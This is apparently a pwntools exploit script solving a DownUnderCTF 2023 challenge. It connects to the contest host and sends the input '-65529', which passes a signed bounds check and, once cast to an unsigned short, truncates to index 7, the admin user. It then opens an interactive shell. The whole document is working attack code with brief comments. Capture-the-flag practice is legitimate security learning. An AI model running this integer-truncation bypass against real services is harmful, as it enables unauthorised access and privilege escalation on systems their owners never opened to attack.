from pwn import *
# Connect to remote server
conn = remote('2023.ductf.dev',30025)
context.log_level = 'debug'
conn.recvuntil(b': ')

# set int to negative number to pass bound, and when cast to unsigned short it truncates to 7 (the index of the admin user)
package = b'-65529'+b'\n'

# send result and get back shell
conn.send(package)
conn.interactive()

# close the connection
conn.close()